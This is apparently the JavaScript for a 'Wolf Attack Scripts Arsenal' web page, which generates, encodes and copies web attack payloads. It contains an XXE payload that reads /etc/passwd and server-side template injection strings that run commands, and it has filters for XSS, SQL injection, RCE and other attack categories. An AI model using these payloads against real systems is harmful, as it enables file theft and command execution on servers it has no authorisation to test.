// Generate XXE payload
function generateXXEPayload() {
    return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`;
}

// Generate SSTI payload
function generateSSTIPayload() {
    const sstiPayloads = [
        '{{7*7}}',
        '{{config}}',
        '{{"".__class__.__mro__[2].__subclasses__()}}',
        '${7*7}',
        '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }',
        '#set($ex=$rt.getRuntime().exec("whoami"))'
    ];
    
    return sstiPayloads[Math.floor(Math.random() * sstiPayloads.length)];
}

// Apply encoding to payload
function applyEncoding(payload, encoding) {
    switch (encoding) {
        case 'url':
            return encodeURIComponent(payload);
        case 'html':
            return payload.replace(/[<>&"']/g, function(match) {
                const htmlEntities = {
                    '<': '&lt;',
                    '>': '&gt;',
                    '&': '&amp;',
                    '"': '&quot;',
                    "'": '&#39;'
                };
                return htmlEntities[match];
            });
        case 'base64':
            return btoa(payload);
        case 'unicode':
            return payload.split('').map(char => 
                '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4)
            ).join('');
        default:
            return payload;
    }
}

// Copy generated payload
function copyGeneratedPayload() {
    const payload = document.getElementById('generatedPayload').value;
    if (payload) {
        navigator.clipboard.writeText(payload).then(() => {
            showNotification('📋 Generated payload copied!', 'success');
        }).catch(() => {
            showNotification('❌ Failed to copy payload', 'error');
        });
    }
}

// Show script statistics
function showScriptStats() {
    const sessionTime = Math.floor((Date.now() - scriptStats.sessionStart) / 1000 / 60);
    const totalCategories = Object.keys(scriptStats.payloadUsage).length;
    
    const statsContent = `
    <div class="modal fade" id="scriptStatsModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content bg-dark text-white">
                <div class="modal-header border-info">
                    <h5 class="modal-title text-info">📊 Attack Scripts Statistics</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="row text-center">
                        <div class="col-6 mb-3">
                            <h4 class="text-warning">${scriptStats.totalCopied}</h4>
                            <small class="text-muted">Scripts Copied</small>
                        </div>
                        <div class="col-6 mb-3">
                            <h4 class="text-success">${totalCategories}</h4>
                            <small class="text-muted">Categories Used</small>
                        </div>
                        <div class="col-6 mb-3">
                            <h4 class="text-info">${sessionTime}</h4>
                            <small class="text-muted">Minutes Active</small>
                        </div>
                        <div class="col-6 mb-3">
                            <h4 class="text-primary">15+</h4>
                            <small class="text-muted">Attack Types</small>
                        </div>
                    </div>
                    
                    <div class="mt-3">
                        <h6 class="text-info">📈 Usage by Category:</h6>
                        <div class="progress-container">
                            ${Object.entries(scriptStats.payloadUsage).map(([category, usage]) => `
                                <div class="d-flex justify-content-between mb-2">
                                    <span class="text-white">${category.replace('-', ' ').toUpperCase()}</span>
                                    <span class="text-warning">${usage}</span>
                                </div>
                                <div class="progress mb-2" style="height: 8px;">
                                    <div class="progress-bar bg-warning" style="width: ${(usage / Math.max(...Object.values(scriptStats.payloadUsage))) * 100}%"></div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                    
                    <div class="mt-3">
                        <h6 class="text-info">🏆 Achievements:</h6>
                        <div class="d-flex flex-wrap gap-2">
                            ${scriptStats.totalCopied >= 10 ? '<span class="badge bg-success">🎯 Script Master</span>' : ''}
                            ${totalCategories >= 5 ? '<span class="badge bg-info">🔍 Explorer</span>' : ''}
                            ${sessionTime >= 15 ? '<span class="badge bg-warning">⏰ Dedicated</span>' : ''}
                            ${scriptStats.totalCopied >= 50 ? '<span class="badge bg-danger">🚀 Power User</span>' : ''}
                        </div>
                    </div>
                </div>
                <div class="modal-footer border-info">
                    <button type="button" class="btn btn-outline-info" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-outline-warning" onclick="resetStats()">Reset Stats</button>
                </div>
            </div>
        </div>
    </div>`;
    
    // Remove existing modal if any
    const existingModal = document.getElementById('scriptStatsModal');
    if (existingModal) {
        existingModal.remove();
    }
    
    // Add modal to body
    document.body.insertAdjacentHTML('beforeend', statsContent);
    
    // Show modal
    const modal = new bootstrap.Modal(document.getElementById('scriptStatsModal'));
    modal.show();
}

// Reset statistics
function resetStats() {
    if (confirm('Are you sure you want to reset all statistics?')) {
        scriptStats = {
            totalCopied: 0,
            mostUsedCategory: '',
            sessionStart: Date.now(),
            payloadUsage: {}
        };
        showNotification('📊 Statistics reset successfully!', 'success');
        
        // Close modal
        const modal = bootstrap.Modal.getInstance(document.getElementById('scriptStatsModal'));
        modal.hide();
    }
}

// Search functionality
function initializeSearch() {
    const searchInput = document.createElement('input');
    searchInput.type = 'text';
    searchInput.className = 'form-control bg-dark text-white';
    searchInput.placeholder = '🔍 Search attack scripts...';
    searchInput.style.cssText = 'position: fixed; top: 10px; right: 10px; width: 300px; z-index: 10000;';
    
    searchInput.addEventListener('input', function() {
        const searchTerm = this.value.toLowerCase();
        const scriptContainers = document.querySelectorAll('.script-container');
        
        scriptContainers.forEach(container => {
            const title = container.querySelector('.script-header h5').textContent.toLowerCase();
            const content = container.querySelector('.script-content').textContent.toLowerCase();
            
            if (title.includes(searchTerm) || content.includes(searchTerm)) {
                container.style.display = 'block';
            } else {
                container.style.display = searchTerm === '' ? 'block' : 'none';
            }
        });
    });
    
    document.body.appendChild(searchInput);
}

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Ctrl+F for search
    if (e.ctrlKey && e.key === 'f') {
        e.preventDefault();
        const searchInput = document.querySelector('input[placeholder*="Search"]');
        if (searchInput) {
            searchInput.focus();
        }
    }
    
    // Ctrl+E for export
    if (e.ctrlKey && e.key === 'e') {
        e.preventDefault();
        exportAllScripts();
    }
    
    // Ctrl+G for generator
    if (e.ctrlKey && e.key === 'g') {
        e.preventDefault();
        showPayloadGenerator();
    }
    
    // Ctrl+S for stats
    if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
        showScriptStats();
    }
});

// Advanced features
function initializeAdvancedFeatures() {
    // Add syntax highlighting
    addSyntaxHighlighting();
    
    // Add copy buttons to all script containers
    enhanceCopyButtons();
    
    // Add category filters
    addCategoryFilters();
    
    // Add severity indicators
    enhanceSeverityIndicators();
}

// Add syntax highlighting
function addSyntaxHighlighting() {
    const scriptContents = document.querySelectorAll('.script-content');
    scriptContents.forEach(content => {
        let html = content.innerHTML;
        
        // Highlight HTML tags
        html = html.replace(/(&lt;[^&]*&gt;)/g, '<span style="color: #ff6b6b;">$1</span>');
        
        // Highlight SQL keywords
        html = html.replace(/\b(SELECT|FROM|WHERE|UNION|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\b/gi, 
            '<span style="color: #4ecdc4; font-weight: bold;">$1</span>');
        
        // Highlight JavaScript keywords
        html = html.replace(/\b(function|var|let|const|if|else|for|while|return)\b/g, 
            '<span style="color: #45b7d1; font-weight: bold;">$1</span>');
        
        // Highlight strings
        html = html.replace(/(["'])((?:(?!\1)[^\\]|\\.)*)(\1)/g, 
            '<span style="color: #96ceb4;">$1$2$3</span>');
        
        content.innerHTML = html;
    });
}

// Enhance copy buttons
function enhanceCopyButtons() {
    const copyButtons = document.querySelectorAll('.copy-btn');
    copyButtons.forEach(button => {
        button.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.1)';
        });
        
        button.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1)';
        });
    });
}

// Add category filters
function addCategoryFilters() {
    const filterContainer = document.createElement('div');
    filterContainer.className = 'container-fluid mb-4';
    filterContainer.innerHTML = `
        <div class="row">
            <div class="col-12">
                <h5 class="text-warning mb-3">🔧 Filter by Category:</h5>
                <div class="d-flex flex-wrap gap-2">
                    <button class="btn btn-outline-light btn-sm filter-btn active" data-filter="all">All</button>
                    <button class="btn btn-outline-danger btn-sm filter-btn" data-filter="xss-scripts">XSS</button>
                    <button class="btn btn-outline-info btn-sm filter-btn" data-filter="sql-injection">SQL Injection</button>
                    <button class="btn btn-outline-primary btn-sm filter-btn" data-filter="rce-scripts">RCE</button>
                    <button class="btn btn-outline-success btn-sm filter-btn" data-filter="lfi-scripts">LFI</button>
                    <button class="btn btn-outline-warning btn-sm filter-btn" data-filter="xxe-scripts">XXE</button>
                    <button class="btn btn-outline-secondary btn-sm filter-btn" data-filter="csrf-scripts">CSRF</button>
                    <button class="btn btn-outline-info btn-sm filter-btn" data-filter="ssti-scripts">SSTI</button>
                    <button class="btn btn-outline-warning btn-sm filter-btn" data-filter="nosql-scripts">NoSQL</button>
                </div>
            </div>
        </div>
    `;
    
    // Insert after the header
    const header = document.querySelector('.container-fluid');
    header.parentNode.insertBefore(filterContainer, header.nextSibling);
    
    // Add filter functionality
    const filterButtons = filterContainer.querySelectorAll('.filter-btn');
    filterButtons.forEach(button => {
        button.addEventListener('click', function() {
            const filter = this.dataset.filter;
            
            // Update active button
            filterButtons.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');
            
            // Filter categories
            const categories = document.querySelectorAll('.attack-category');
            categories.forEach(category => {
                if (filter === 'all' || category.id === filter) {
                    category.style.display = 'block';
                } else {
                    category.style.display = 'none';
                }
            });
        });
    });
}

// Enhance severity indicators
function enhanceSeverityIndicators() {
    const badges = document.querySelectorAll('.badge');
    badges.forEach(badge => {
        const severity = badge.textContent.toLowerCase();
        switch (severity) {
            case 'critical':
                badge.style.animation = 'pulse 2s infinite';
                break;
            case 'high':
                badge.style.boxShadow = '0 0 10px rgba(255, 193, 7, 0.5)';
                break;
        }
    });
}

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('🐺 Wolf Attack Scripts Arsenal loaded successfully!');
    console.log('🚀 Advanced features initialized!');
    console.log('⌨️ Keyboard shortcuts: Ctrl+F (Search), Ctrl+E (Export), Ctrl+G (Generator), Ctrl+S (Stats)');
    
    // Initialize all features
    initializeSearch();
    initializeAdvancedFeatures();
    
    // Update total payloads count
    const totalScripts = document.querySelectorAll('.script-container').length;
    document.getElementById('totalPayloads').textContent = totalScripts + '+';
    
    // Add welcome message
    showNotification('🐺 Welcome to Wolf Attack Scripts Arsenal!', 'success');
    
    // Track page load
    console.log('📊 Session started at:', new Date().toISOString());
});

// Auto-save statistics
setInterval(() => {
    localStorage.setItem('wolfScriptStats', JSON.stringify(scriptStats));
}, 30000); // Save every 30 seconds

// Load saved statistics
const savedStats = localStorage.getItem('wolfScriptStats');
if (savedStats) {
    try {
        const parsed = JSON.parse(savedStats);
        // Only load if from same session (within 24 hours)
        if (Date.now() - parsed.sessionStart < 24 * 60 * 60 * 1000) {
            scriptStats = parsed;
        }
    } catch (e) {
        console.log('Could not load saved statistics');
    }
}

// Export functions for global access
window.wolfAttackScripts = {
    copyScript,
    exportAllScripts,
    showPayloadGenerator,
    generatePayload,
    showScriptStats,
    resetStats
};

// Additional utility functions for full functionality
function showLoading() {
    let spinner = document.getElementById('loadingSpinner');
    if (!spinner) {
        spinner = document.createElement('div');
        spinner.id = 'loadingSpinner';
        spinner.className = 'loading-spinner';
        spinner.innerHTML = '<div class="spinner-border text-warning" role="status"></div>';
        spinner.style.cssText = 'position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; display: none;';
        document.body.appendChild(spinner);
    }
    spinner.style.display = 'block';
}

function hideLoading() {
    const spinner = document.getElementById('loadingSpinner');
    if (spinner) {
        spinner.style.display = 'none';
    }
}

function showToast(message, type = 'info') {
    const toastHtml = `
        <div class="toast show" role="alert" style="position: fixed; top: 100px; right: 20px; z-index: 9999; min-width: 300px;">
            <div class="toast-header bg-dark text-white">
                <strong class="me-auto">${type === 'success' ? '✅' : type === 'error' ? '❌' : type === 'warning' ? '⚠️' : 'ℹ️'} Wolf Arsenal</strong>
                <button type="button" class="btn-close btn-close-white" onclick="this.closest('.toast').remove()"></button>
            </div>
            <div class="toast-body bg-dark text-white">
                ${message}
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', toastHtml);
    
    // Auto remove after 3 seconds
    setTimeout(() => {
        const toasts = document.querySelectorAll('.toast');
        if (toasts.length > 0) {
            toasts[toasts.length - 1].remove();
        }
    }, 3000);
}

function updateProgressBar() {
    let progressBar = document.getElementById('progressBar');
    if (!progressBar) {
        const progressContainer = document.createElement('div');
        progressContainer.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 4px; background: rgba(0,0,0,0.3); z-index: 9999;';
        progressContainer.innerHTML = '<div id="progressBar" style="height: 100%; background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00); width: 0%; transition: width 0.3s ease;"></div>';
        document.body.insertBefore(progressContainer, document.body.firstChild);
        progressBar = document.getElementById('progressBar');
    }
    
    const visibleScripts = document.querySelectorAll('.script-container:not([style*="display: none"])').length;
    const totalScripts = document.querySelectorAll('.script-container').length;
    const percentage = totalScripts > 0 ? (visibleScripts / totalScripts) * 100 : 0;
    
    progressBar.style.width = percentage + '%';
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function toggleTheme() {
    document.body.classList.toggle('light-theme');
    const isDark = !document.body.classList.contains('light-theme');
    localStorage.setItem('darkTheme', isDark);
    showToast(`Switched to ${isDark ? 'dark' : 'light'} theme`, 'info');
}

// Initialize search functionality
function initializeSearch() {
    let searchInput = document.getElementById('searchInput');
    if (!searchInput) {
        const searchContainer = document.createElement('div');
        searchContainer.style.cssText = 'position: fixed; top: 20px; right: 20px; z-index: 1000;';
        searchContainer.innerHTML = `
            <input type="text" class="form-control bg-dark text-white border-warning" 
                   id="searchInput" placeholder="🔍 Search attack scripts..." 
                   style="width: 300px;">
        `;
        document.body.appendChild(searchContainer);
        searchInput = document.getElementById('searchInput');
        
        searchInput.addEventListener('input', function(e) {
            const query = e.target.value.toLowerCase();
            performSearch(query);
        });
    }
}

function performSearch(query) {
    const scriptContainers = document.querySelectorAll('.script-container');
    const categories = document.querySelectorAll('.attack-category');
    
    if (query === '') {
        scriptContainers.forEach(container => container.style.display = 'block');
        categories.forEach(category => category.style.display = 'block');
        return;
    }
    
    let hasResults = false;
    
    categories.forEach(category => {
        let categoryHasResults = false;
        const containers = category.querySelectorAll('.script-container');
        
        containers.forEach(container => {
            const content = container.textContent.toLowerCase();
            if (content.includes(query)) {
                container.style.display = 'block';
                categoryHasResults = true;
                hasResults = true;
            } else {
                container.style.display = 'none';
            }
        });
        
        category.style.display = categoryHasResults ? 'block' : 'none';
    });
    
    if (!hasResults) {
        showToast('No results found for: ' + query, 'warning');
    }
    
    updateProgressBar();
}

// Initialize filter buttons
function initializeFilters() {
    if (document.querySelector('.filter-container')) return;
    
    const filterContainer = document.createElement('div');
    filterContainer.className = 'filter-container';
    filterContainer.style.cssText = 'position: fixed; top: 120px; left: 20px; z-index: 1000;';
    filterContainer.innerHTML = `
        <div class="d-flex flex-column gap-2">
            <button class="btn btn-sm btn-outline-light filter-btn active" data-filter="all">All</button>
            <button class="btn btn-sm btn-outline-danger filter-btn" data-filter="xss-scripts">XSS</button>
            <button class="btn btn-sm btn-outline-warning filter-btn" data-filter="sqli-scripts">SQL</button>
            <button class="btn btn-sm btn-outline-info filter-btn" data-filter="rce-scripts">RCE</button>
            <button class="btn btn-sm btn-outline-success filter-btn" data-filter="lfi-scripts">LFI</button>
            <button class="btn btn-sm btn-outline-primary filter-btn" data-filter="xxe-scripts">XXE</button>
            <button class="btn btn-sm btn-outline-secondary filter-btn" data-filter="csrf-scripts">CSRF</button>
            <button class="btn btn-sm btn-outline-info filter-btn" data-filter="ssti-scripts">SSTI</button>
            <button class="btn btn-sm btn-outline-warning filter-btn" data-filter="nosql-scripts">NoSQL</button>
        </div>
    `;
    
    document.body.appendChild(filterContainer);
    
    // Add event listeners to filter buttons
    filterContainer.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            const filter = this.dataset.filter;
            applyFilter(filter);
            
            // Update active button
            filterContainer.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            this.classList.add('active');
        });
    });
}

function applyFilter(filter) {
    const categories = document.querySelectorAll('.attack-category');
    
    if (filter === 'all') {
        categories.forEach(category => category.style.display = 'block');
    } else {
        categories.forEach(category => {
            if (category.id === filter) {
                category.style.display = 'block';
                category.scrollIntoView({ behavior: 'smooth', block: 'start' });
            } else {
                category.style.display = 'none';
            }
        });
    }
    
    updateProgressBar();
}

// Add floating action button
function initializeFAB() {
    if (document.querySelector('.fab')) return;
    
    const fab = document.createElement('button');
    fab.className = 'fab';
    fab.innerHTML = '⬆️';
    fab.title = 'Back to Top';
    fab.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        width: 60px;
        height: 60px;
        border-radius: 50%;
        background: linear-gradient(45deg, #ff0000, #cc0000);
        border: none;
        color: white;
        font-size: 1.5rem;
        box-shadow: 0 4px 20px rgba(255, 0, 0, 0.4);
        z-index: 1000;
        cursor: pointer;
        transition: all 0.3s ease;
    `;
    
    fab.addEventListener('click', scrollToTop);
    fab.addEventListener('mouseenter', () => {
        fab.style.transform = 'scale(1.1)';
        fab.style.boxShadow = '0 6px 25px rgba(255, 0, 0, 0.6)';
    });
    fab.addEventListener('mouseleave', () => {
        fab.style.transform = 'scale(1)';
        fab.style.boxShadow = '0 4px 20px rgba(255, 0, 0, 0.4)';
    });
    
    document.body.appendChild(fab);
}

// Keyboard shortcuts
function setupKeyboardShortcuts() {
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey) {
            switch(e.key) {
                case 'f':
                    e.preventDefault();
                    const searchInput = document.getElementById('searchInput');
                    if (searchInput) searchInput.focus();
                    break;
                case 'e':
                    e.preventDefault();
                    exportAllScripts();
                    break;
                case 'g':
                    e.preventDefault();
                    showPayloadGenerator();
                    break;
                case 's':
                    e.preventDefault();
                    showScriptStats();
                    break;
                case 'h':
                    e.preventDefault();
                    showHelp();
                    break;
            }
        } else if (e.key === 'Escape') {
            const searchInput = document.getElementById('searchInput');
            if (searchInput) {
                searchInput.value = '';
                performSearch('');
            }
        }
    });
}

// Enhanced initialization
function enhancedInitialization() {
    initializeSearch();
    initializeFilters();
    initializeFAB();
    updateProgressBar();
    setupKeyboardShortcuts();
    
    // Show welcome message
    if (!localStorage.getItem('welcomeShown')) {
        setTimeout(() => {
            showToast('Welcome to Wolf Attack Scripts Arsenal! 🐺 Use Ctrl+H for help.', 'info');
            localStorage.setItem('welcomeShown', 'true');
        }, 1000);
    }
}

// Initialize when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', enhancedInitialization);
} else {
    enhancedInitialization();
}

console.log('🐺 Wolf Attack Scripts Arsenal - All systems operational!');
console.log('💀 Ready for cybersecurity testing and education!');
console.log('⚠️ Remember: Use responsibly and only on authorized targets!');